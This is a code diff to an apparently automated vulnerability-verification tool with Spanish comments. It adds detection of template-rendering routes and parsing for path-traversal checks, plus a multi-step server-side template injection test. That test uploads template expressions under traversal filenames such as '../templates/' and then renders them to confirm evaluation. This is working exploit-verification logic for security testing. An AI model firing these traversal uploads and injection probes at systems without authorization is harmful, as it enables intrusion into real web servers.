@@ -493,6 +493,9 @@ def _scan_web_routes(source_dir: str) -> list:
                         r'request\.form\.get\(["\']([^"\']+)["\']', s):
                     cur_params[pm.group(1)] = ""
                     cur_meth = "POST"
+                # Detect render_template / render_template_string calls: marks render endpoints
+                if re.search(r'render_template\s*\(', s):
+                    cur_params["__RENDERS_TEMPLATE__"] = "1"
         if cur_ep is not None:
             routes.append((cur_ep, dict(cur_params), cur_meth))
 
@@ -507,29 +510,27 @@ def _scan_web_routes(source_dir: str) -> list:
         full_rb = "".join(lines)
         # Rack::Static (multi-line): use Rack::Static, ... urls: [...] ...
         # Uses full-file scan because the declaration spans several lines.
-        for m_static in re.finditer(
-                r'Rack::Static([^.]*?)(?=\brun\b|\bend\b|\Z)', full_rb, re.DOTALL):
-            block = m_static.group(0)
-            # Extract urls
-            m_urls = re.search(r'urls\s*:\s*\[([^\]]+)\]', block)
+        # Strategy: find each `Rack::Static` occurrence and extract the NEXT 400 chars as block.
+        for m_static_pos in [m.start() for m in re.finditer(r'Rack::Static', full_rb)]:
+            block = full_rb[m_static_pos:m_static_pos + 400]
+            m_urls = re.search(r'urls\s*:\s*\[([^\]]+)\]', block, re.DOTALL)
             if not m_urls:
                 continue
-            # Extract root (optional, used for prefix-bypass canary planting)
+            # Extract root: (optional, for prefix-bypass canary planting)
             rack_root = ""
-            m_root = re.search(r'root\s*:\s*["\']([^"\']+)["\']', block)
-            if m_root:
-                rack_root = m_root.group(1)
-            elif re.search(r'root\s*:\s*File\.join\(__dir__\s*,\s*["\']([^"\']+)["\']', block):
-                m_rd = re.search(r'root\s*:\s*File\.join\(__dir__\s*,\s*["\']([^"\']+)["\']', block)
-                if m_rd:
-                    rack_root = "WORKDIR/" + m_rd.group(1)
+            m_root_str = re.search(r'root\s*:\s*["\']([^"\']+)["\']', block)
+            m_root_join = re.search(
+                r'root\s*:\s*File\.join\(__dir__\s*,\s*["\']([^"\']+)["\']', block)
+            if m_root_str:
+                rack_root = m_root_str.group(1)
+            elif m_root_join:
+                rack_root = "WORKDIR/" + m_root_join.group(1)
             urls_str = m_urls.group(1)
             for pu in re.finditer(r'["\']([^"\']+)["\']', urls_str):
                 prefix = pu.group(1).rstrip("/") + "/"
-                params = {"URL_PATH": ""}
+                params: dict = {"URL_PATH": ""}
                 if rack_root:
                     params["RACK_STATIC_ROOT"] = rack_root
-                # URL_PATH mode: traversal payload appended after the prefix
                 routes.append((prefix, params, "GET"))
         for line in lines:
             s = line.strip()
@@ -2185,6 +2186,85 @@ def verify_generic_ssti(
             if found:
                 break
 
+        # --- Multi-step SSTI: upload-then-render (e.g. CVE-2026-27641 flask-reuploaded) --------
+        # Algunos ataques SSTI requieren dos peticiones: (1) subir un fichero que contiene
+        # sintaxis de plantilla a traves de un endpoint de subida con path traversal, (2) rendir
+        # ese fichero desde un endpoint de renderizado. El verificador simple (una sola peticion)
+        # no los cubre. Detectamos el patron buscando en las rutas escaneadas:
+        #   - Un endpoint de SUBIDA: POST con params que incluyan 'name' o 'filename' (upload).
+        #   - Un endpoint de RENDERIZADO: GET con __RENDERS_TEMPLATE__ en sus params.
+        # Si ambos existen, intentamos la cadena upload -> render.
+        if not found:
+            _upload_eps = [(ep, ps, me) for ep, ps, me in scanned
+                          if me == "POST" and any(k in ("name", "filename", "file", "path")
+                                                  for k in (ps or {}))]
+            _render_eps = [(ep, ps, me) for ep, ps, me in scanned
+                           if me == "GET" and isinstance(ps, dict)
+                           and ps.get("__RENDERS_TEMPLATE__")]
+            if _upload_eps and _render_eps:
+                step("intentando SSTI multi-step: upload traversal -> render...")
+                import io as _io
+                _ssti_payloads_ms = [
+                    "{{" + str(a) + "*" + str(b) + "}}",
+                    "${" + str(a) + "*" + str(b) + "}",
+                    "#{" + str(a) + "*" + str(b) + "}",
+                ]
+                for _up_ep, _up_ps, _up_me in _upload_eps:
+                    if found:
+                        break
+                    for _ssti_pl in _ssti_payloads_ms:
+                        if found:
+                            break
+                        _tpl_name = f"binoracle_ssti_{_token()}.html"
+                        _tpl_content = f"<!-- binoracle test -->{_ssti_pl}"
+                        # Build a traversal name that writes to templates/ (or similar)
+                        # Common patterns: ../templates/<name>, ../../templates/<name>
+                        _name_candidates = [
+                            f"../templates/{_tpl_name}",
+                            f"../../templates/{_tpl_name}",
+                            f"../views/{_tpl_name}",
+                        ]
+                        for _nc in _name_candidates:
+                            if found:
+                                break
+                            try:
+                                _file_obj = _io.BytesIO(_tpl_content.encode())
+                                _up_url = base_url + _up_ep
+                                _up_params = dict(_up_ps) if isinstance(_up_ps, dict) else {}
+                                _up_params.pop("__RENDERS_TEMPLATE__", None)
+                                # Set traversal name in the name/filename param
+                                for _np in ("name", "filename", "file", "path"):
+                                    if _np in _up_params:
+                                        _up_params[_np] = _nc
+                                        break
+                                else:
+                                    _up_params["name"] = _nc
+                                _up_resp = _http_request(
+                                    "POST", _up_url, timeout=15, params=_up_params,
+                                    files={"file": (_tpl_name, _file_obj, "text/html")})
+                                if _up_resp.status_code not in (200, 201, 204):
+                                    continue
+                                # Try rendering -- strip Flask path variables like <path:var>
+                                for _rend_ep, _rend_ps, _rend_me in _render_eps:
+                                    _rend_base = re.sub(r'/<[^>]+>', '', _rend_ep)
+                                    _rend_url = base_url + _rend_base.rstrip("/") + "/" + _tpl_name
+                                    _rend_resp = _http_request("GET", _rend_url, timeout=15)
+                                    if str(expected) in (_rend_resp.text or ""):
+                                        found = True
+                                        win_ep, win_param = _rend_ep, "URL_PATH"
+                                        res.evidence["payload_ganador"] = _ssti_pl
+                                        res.evidence["upload_name_ganador"] = _nc
+                                        res.evidence["render_url_ganador"] = _rend_url
+                                        res.evidence["resultado_esperado_ganador"] = str(expected)
+                                        res.evidence["respuesta_cuerpo_recorte"] = (
+                                            _rend_resp.text or "")[:500]
+                                        step(f"VERIFICADO (multi-step): upload {_nc!r} + render "
+                                             f"{_rend_url!r} devolvio {expected}.")
+                                        break
+                            except Exception:
+                                pass
+        # ------------------------------------------------------------------------------------
+
         # Strip query string from endpoint - params are always sent via params= dict separately;
         # duplicate query params (from both the endpoint path and params=) would make Flask/Django
         # use the placeholder literal instead of the payload.
@@ -2195,11 +2275,18 @@ def verify_generic_ssti(
         if found:
             res.verified = True
             res.ok = True
-            res.detail = (f"SSTI confirmada: la peticion con {win_param}="
-                          f"{res.evidence['payload_ganador']!r} hizo que el motor de plantillas "
-                          f"EVALUARA la expresion y devolviera "
-                          f"{res.evidence['resultado_esperado_ganador']} en la respuesta -- "
-                          f"prueba inequivoca de evaluacion de codigo en servidor")
+            if res.evidence.get("upload_name_ganador"):
+                res.detail = (
+                    f"SSTI multi-step confirmada: upload con name={res.evidence['upload_name_ganador']!r} "
+                    f"(payload: {res.evidence['payload_ganador']!r}) + render en "
+                    f"{res.evidence.get('render_url_ganador', win_ep)!r} devolvio {expected} -- "
+                    f"el motor de plantillas EVALUO la plantilla subida por path traversal")
+            else:
+                res.detail = (f"SSTI confirmada: la peticion con {win_param}="
+                              f"{res.evidence['payload_ganador']!r} hizo que el motor de plantillas "
+                              f"EVALUARA la expresion y devolviera "
+                              f"{res.evidence['resultado_esperado_ganador']} en la respuesta -- "
+                              f"prueba inequivoca de evaluacion de codigo en servidor")
         else:
             res.ok = True
             res.detail = (f"se probaron {len(tried_all)} sintaxis de plantilla para {win_param} "
